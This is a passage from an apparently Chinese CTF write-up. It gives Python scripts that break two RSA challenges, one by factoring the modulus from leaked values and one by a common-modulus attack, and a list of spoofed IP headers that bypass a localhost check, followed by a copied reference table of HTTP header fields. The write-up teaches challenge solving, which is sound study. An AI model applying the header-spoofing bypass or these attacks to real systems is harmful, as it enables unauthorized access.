+<p>由p+q和p-q我们能算出p,q，即N=p*q也知道了，c是密文，e也知道直接用gmpy2就能算出d，exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e=<span class="number">8817541</span></span><br><span class="line">paq=<span class="number">16321432012361424715999482612620733350248842171519096058290401228839812649586719552027326066167539574579803995633219307746250179205827394262822225496256560</span></span><br><span class="line">psq=<span class="number">-762917520212563308246814613407392836711488448360655007080799273105995688894593100287666509669227799508891920589926279868282905643495952401909422097272782</span></span><br><span class="line">c=<span class="number">50489857463808300926430257877498323881188812748322681976260520202074367690898181749018527743434038118959830923111311450056657583556281704259092120255347994094472328493911537046586917971842411521641278869273145554989991259437124572940334561139020989426695807874811943663373081092453657052151887455784297691646</span></span><br><span class="line">p = (paq+psq)//<span class="number">2</span></span><br><span class="line">q = (paq-psq)//<span class="number">2</span></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+
+<p>之后转16进制转字符串就行</p>
+<p>gmpy2安装参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/threesoil/p/9926669.html">https://www.cnblogs.com/threesoil/p/9926669.html</a></p>
+<h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><p>和第一题差不多</p>
+<p>本题每访问一次都会给一组随机的e和c，但是p^2+q^2和p-q不变，因此可以考虑共模攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p^2+q^2&#x3D;233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050</span><br><span class="line"></span><br><span class="line">p-q&#x3D;-5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428</span><br><span class="line"></span><br><span class="line">c&#x3D;87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463</span><br><span class="line"></span><br><span class="line">flag&#x3D;??????</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463</span></span><br><span class="line">e1 = <span class="number">11398291</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">18705967865609703350505203897353013349572268163704731296055745391917469960518910212955107755812854024901962046413249126535525965403804342347153196889210756001085291251582862612150330490682927199414305833505087697733874760767084138461692058648555896587248051209761491427866198455080624903527433009258377083135</span></span><br><span class="line">e2 = <span class="number">11511989</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050</span></span><br><span class="line">B = <span class="number">-5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428</span></span><br><span class="line"></span><br><span class="line">n = (A-B**<span class="number">2</span>)//<span class="number">2</span></span><br><span class="line"><span class="comment"># print n</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line"></span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>这题真的很。。。</p>
+<p>尝试admin，提示不是admin</p>
+<p>随便登个账号，抓包，在html结尾发现<code>L0g1n.php</code></p>
+<p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321184046.png"></p>
+<p>访问发现一环套一环，最后构造就能得到flag的base64编码形式了</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321184336.png" style="zoom:80%;">
+
+<p><strong>伪造ip:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-<span class="keyword">For</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Forwarded-Host:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-remote-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-remote-addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="literal">True</span>-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-<span class="keyword">Real</span>-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>记一下http的常见字段：</strong></p>
+<p><strong>请求字段</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">协议头字段名</th>
+<th align="center">说明</th>
+<th align="center">示例</th>
+<th align="center">状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Accept</td>
+<td align="center">能够接受的回应内容类型（Content-Types）。参见<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86">内容协商</a>。</td>
+<td align="center"><code>Accept: text/plain</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Charset</td>
+<td align="center">能够接受的字符集</td>
+<td align="center"><code>Accept-Charset: utf-8</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Encoding</td>
+<td align="center">能够接受的编码方式列表。参考<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%8E%8B%E7%BC%A9">HTTP压缩</a>。</td>
+<td align="center"><code>Accept-Encoding: gzip, deflate</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Language</td>
+<td align="center">能够接受的回应内容的自然语言列表。参考 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86">内容协商</a> 。</td>
+<td align="center"><code>Accept-Language: en-US</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Datetime</td>
+<td align="center">能够接受的按照时间来表示的版本</td>
+<td align="center"><code>Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</code></td>
+<td align="center">临时</td>
+</tr>
+<tr>
+<td align="center">Authorization</td>
+<td align="center">用于超文本传输协议的认证的认证信息</td>
+<td align="center"><code>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E5%BF%AB%E7%85%A7">Cache-Control</a></td>
+<td align="center">用来指定在这次的请求/响应链中的所有缓存机制 都必须 遵守的指令</td>
+<td align="center"><code>Cache-Control: no-cache</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Connection</td>
+<td align="center">该浏览器想要优先使用的连接类型[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-rfc7230_connection-8">8]</a></td>
+<td align="center"><code>Connection: keep-alive``Connection: Upgrade</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Cookie</td>
+<td align="center">之前由服务器通过 Set- Cookie （下文详述）发送的一个 超文本传输协议Cookie</td>
+<td align="center"><code>Cookie: $Version=1; Skin=new;</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Content-Length</td>
+<td align="center">以 八位字节数组 （8位的字节）表示的请求体的长度</td>
+<td align="center"><code>Content-Length: 348</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-MD5</td>
+<td align="center">请求体的内容的二进制 MD5 散列值，以 Base64 编码的结果</td>
+<td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td>
+<td align="center">过时的[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-9">9]</a></td>
+</tr>
+<tr>
+<td align="center">Content-Type</td>
+<td align="center">请求体的 多媒体类型 （用于POST和PUT请求中）</td>
+<td align="center"><code>Content-Type: application/x-www-form-urlencoded</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Date</td>
+<td align="center">发送该消息的日期和时间(按照 RFC 7231 中定义的”超文本传输协议日期”格式来发送)</td>
+<td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Expect</td>
+<td align="center">表明客户端要求服务器做出特定的行为</td>
+<td align="center"><code>Expect: 100-continue</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">From</td>
+<td align="center">发起此请求的用户的邮件地址</td>
+<td align="center"><code>From: user@example.com</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Host</td>
+<td align="center">服务器的域名(用于虚拟主机 )，以及服务器所监听的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">传输控制协议</a>端口号。如果所请求的端口是对应的服务的标准端口，则端口号可被省略。[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-10">10]</a> 自超文件传输协议版本1.1（HTTP/1.1）开始便是必需字段。</td>
+<td align="center"><code>Host: en.wikipedia.org:80``Host: en.wikipedia.org</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-Match</td>
+<td align="center">仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要作用时，用作像 PUT 这样的方法中，仅当从用户上次更新某个资源以来，该资源未被修改的情况下，才更新该资源。</td>
+<td align="center"><code>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-Modified-Since</td>
+<td align="center">允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ）</td>
+<td align="center"><code>If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-None-Match</td>
+<td align="center">允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ），参考 超文本传输协议 的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP_ETag">实体标记</a></td>
+<td align="center"><code>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-Range</td>
+<td align="center">如果该实体未被修改过，则向我发送我所缺少的那一个或多个部分；否则，发送整个新的实体</td>
+<td align="center"><code>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">If-Unmodified-Since</td>
+<td align="center">仅当该实体自某个特定时间已来未被修改的情况下，才发送回应。</td>
+<td align="center"><code>If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Max-Forwards</td>
+<td align="center">限制该消息可被代理及网关转发的次数。</td>
+<td align="center"><code>Max-Forwards: 10</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Origin</td>
+<td align="center">发起一个针对 跨来源资源共享 的请求（要求服务器在回应中加入一个‘访问控制-允许来源’（’Access-Control-Allow-Origin’）字段）。</td>
+<td align="center"><code>Origin: http://www.example-social-network.com</code></td>
+<td align="center">常设: 标准</td>
+</tr>
+<tr>
+<td align="center">Pragma</td>
+<td align="center">与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。</td>
+<td align="center"><code>Pragma: no-cache</code></td>
+<td align="center">常设但不常用</td>
+</tr>
+<tr>
+<td align="center">Proxy-Authorization</td>
+<td align="center">用来向代理进行认证的认证信息。</td>
+<td align="center"><code>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Range</td>
+<td align="center">仅请求某个实体的一部分。字节偏移以0开始。参见<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%AD%97%E8%8A%82%E6%9C%8D%E5%8A%A1&action=edit&redlink=1">字节服务</a>。</td>
+<td align="center"><code>Range: bytes=500-999</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%8F%83%E7%85%A7%E4%BD%8D%E5%9D%80">Referer</a> [*<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Sic">sic</a>*] [<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-11">11]</a></td>
+<td align="center">表示浏览器所访问的前一个页面，正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面。</td>
+<td align="center"><code>Referer: http://en.wikipedia.org/wiki/Main_Page</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">TE</td>
+<td align="center">浏览器预期接受的传输编码方式：可使用回应协议头 Transfer-Encoding 字段中的值；另外还可用”trailers”（与”分块 “传输方式相关）这个值来表明浏览器希望在最后一个尺寸为0的块之后还接收到一些额外的字段。</td>
+<td align="center"><code>TE: trailers, deflate</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">User-Agent</td>
+<td align="center">浏览器的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86">浏览器身份标识字符串</a></td>
+<td align="center"><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Upgrade</td>
+<td align="center">要求服务器升级到另一个协议。</td>
+<td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Via</td>
+<td align="center">向服务器告知，这个请求是由哪些代理发出的。</td>
+<td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Warning</td>
+<td align="center">一个一般性的警告，告知，在实体内容体中可能存在错误。</td>
+<td align="center"><code>Warning: 199 Miscellaneous warning</code></td>
+<td align="center">常设</td>
+</tr>
+</tbody></table>
+<p><strong>常见的非标准请求字段</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">字段名</th>
+<th align="center">说明</th>
+<th align="center">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">X-Requested-With</td>
+<td align="center">主要用于标识 Ajax 及可扩展标记语言 请求。大部分的JavaScript框架会发送这个字段，且将其值设置为 XMLHttpRequest</td>
+<td align="center"><code>X-Requested-With: XMLHttpRequest</code></td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%AF%B7%E5%8B%BF%E8%BF%BD%E8%B8%AA">DNT</a>[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-12">12]</a></td>
+<td align="center">请求某个网页应用程序停止跟踪某个用户。在火狐浏览器中，相当于X-Do-Not-Track协议头字段（自 Firefox/4.0 Beta 11 版开始支持）。<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Safari">Safari</a> 和 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Internet_Explorer">Internet Explorer</a> 9 也支持这个字段。2011年3月7日，草案提交IETF。[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-13">13]</a> 万维网协会 的跟踪保护工作组正在就此制作一项规范。[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-14">14]</a></td>
+<td align="center"><code>DNT: 1 (DNT启用)``DNT: 0 (DNT被禁用)</code></td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/X-Forwarded-For">X-Forwarded-For</a>[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-15">15]</a></td>
+<td align="center">一个事实标准 ，用于标识某个通过超文本传输协议代理或负载均衡连接到某个网页服务器的客户端的原始互联网地址</td>
+<td align="center"><code>X-Forwarded-For: client1, proxy1, proxy2``X-Forwarded-For: 129.78.138.66, 129.78.64.103</code></td>
+</tr>
+<tr>
+<td align="center">X-Forwarded-Host[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-16">16]</a></td>
+<td align="center">一个事实标准 ，用于识别客户端原本发出的 <code>Host</code> 请求头部[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-17">17]</a>。</td>
+<td align="center"><code>X-Forwarded-Host: en.wikipedia.org:80``X-Forwarded-Host: en.wikipedia.org</code></td>
+</tr>
+<tr>
+<td align="center">X-Forwarded-Proto[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-18">18]</a></td>
+<td align="center">一个事实标准，用于标识某个超文本传输协议请求最初所使用的协议。[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-19">19]</a></td>
+<td align="center"><code>X-Forwarded-Proto: https</code></td>
+</tr>
+<tr>
+<td align="center">Front-End-Https[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-20">20]</a></td>
+<td align="center">被微软的服务器和负载均衡器所使用的非标准头部字段。</td>
+<td align="center"><code>Front-End-Https: on</code></td>
+</tr>
+<tr>
+<td align="center">X-Http-Method-Override[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-21">21]</a></td>
+<td align="center">请求某个网页应用程序使用该协议头字段中指定的方法（一般是PUT或DELETE）来覆盖掉在请求中所指定的方法（一般是POST）。当某个浏览器或防火墙阻止直接发送PUT 或DELETE 方法时（注意，这可能是因为软件中的某个漏洞，因而需要修复，也可能是因为某个配置选项就是如此要求的，因而不应当设法绕过），可使用这种方式。</td>
+<td align="center"><code>X-HTTP-Method-Override: DELETE</code></td>
+</tr>
+<tr>
+<td align="center">X-ATT-DeviceId[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-22">22]</a></td>
+<td align="center">使服务器更容易解读AT&amp;T设备User-Agent字段中常见的设备型号、固件信息。</td>
+<td align="center"><code>X-Att-Deviceid: GT-P7320/P7320XXLPG</code></td>
+</tr>
+<tr>
+<td align="center">X-Wap-Profile[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-23">23]</a></td>
+<td align="center">链接到互联网上的一个XML文件，其完整、仔细地描述了正在连接的设备。右侧以为AT&amp;T Samsung Galaxy S2提供的XML文件为例。</td>
+<td align="center"><code>x-wap-profile: http://wap.samsungmobile.com/uaprof/SGH-I777.xml</code></td>
+</tr>
+<tr>
+<td align="center">Proxy-Connection[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-24">24]</a></td>
+<td align="center">该字段源于早期超文本传输协议版本实现中的错误。与标准的连接（Connection）字段的功能完全相同。</td>
+<td align="center"><code>Proxy-Connection: keep-alive</code></td>
+</tr>
+<tr>
+<td align="center">X-Csrf-Token[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-25">25]</a></td>
+<td align="center">用于防止 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">跨站请求伪造</a>。 辅助用的头部有 <code>X-CSRFToken</code>[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-26">26]</a> 或 <code>X-XSRF-TOKEN</code>[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-27">27]</a></td>
+<td align="center"><code>X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</code></td>
+</tr>
+</tbody></table>
+<p><strong>回应字段</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">字段名</th>
+<th align="center">说明</th>
+<th align="center">例子</th>
+<th align="center">状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Access-Control-Allow-Origin</td>
+<td align="center">指定哪些网站可参与到跨来源资源共享过程中</td>
+<td align="center"><code>Access-Control-Allow-Origin: *</code></td>
+<td align="center">临时</td>
+</tr>
+<tr>
+<td align="center">Accept-Patch[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-28">28]</a></td>
+<td align="center">指定服务器支持的文件格式类型。</td>
+<td align="center"><code>Accept-Patch: text/example;charset=utf-8</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Accept-Ranges</td>
+<td align="center">这个服务器支持哪些种类的部分内容范围</td>
+<td align="center"><code>Accept-Ranges: bytes</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Age</td>
+<td align="center">这个对象在代理缓存中存在的时间，以秒为单位</td>
+<td align="center"><code>Age: 12</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Allow</td>
+<td align="center">对于特定资源有效的动作。针对HTTP/405这一错误代码而使用</td>
+<td align="center"><code>Allow: GET, HEAD</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E5%BF%AB%E7%85%A7">Cache-Control</a></td>
+<td align="center">向从服务器直到客户端在内的所有缓存机制告知，它们是否可以缓存这个对象。其单位为秒</td>
+<td align="center"><code>Cache-Control: max-age=3600</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Connection</td>
+<td align="center">针对该连接所预期的选项[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-rfc7230_connection-8">8]</a></td>
+<td align="center"><code>Connection: close</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Disposition[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-29">29]</a></td>
+<td align="center">一个可以让客户端下载文件并建议文件名的头部。文件名需要用双引号包裹。</td>
+<td align="center"><code>Content-Disposition: attachment; filename=&quot;fname.ext&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Encoding</td>
+<td align="center">在数据上使用的编码类型。参考 超文本传输协议压缩 。</td>
+<td align="center"><code>Content-Encoding: gzip</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Language</td>
+<td align="center">内容所使用的语言[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-30">30]</a></td>
+<td align="center"><code>Content-Language: da</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Length</td>
+<td align="center">回应消息体的长度，以 字节 （8位为一字节）为单位</td>
+<td align="center"><code>Content-Length: 348</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Location</td>
+<td align="center">所返回的数据的一个候选位置</td>
+<td align="center"><code>Content-Location: /index.htm</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-MD5</td>
+<td align="center">回应内容的二进制 MD5 散列，以 Base64 方式编码</td>
+<td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td>
+<td align="center">过时的[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-31">31]</a></td>
+</tr>
+<tr>
+<td align="center">Content-Range</td>
+<td align="center">这条部分消息是属于某条完整消息的哪个部分</td>
+<td align="center"><code>Content-Range: bytes 21010-47021/47022</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Content-Type</td>
+<td align="center">当前内容的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/MIME">MIME</a>类型</td>
+<td align="center"><code>Content-Type: text/html; charset=utf-8</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center">Date</td>
+<td align="center">此条消息被发送时的日期和时间(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td>
+<td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP_ETag">ETag</a></td>
+<td align="center">对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列</td>
+<td align="center"><code>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td align="center">常设</td>
+</tr>
+<tr>
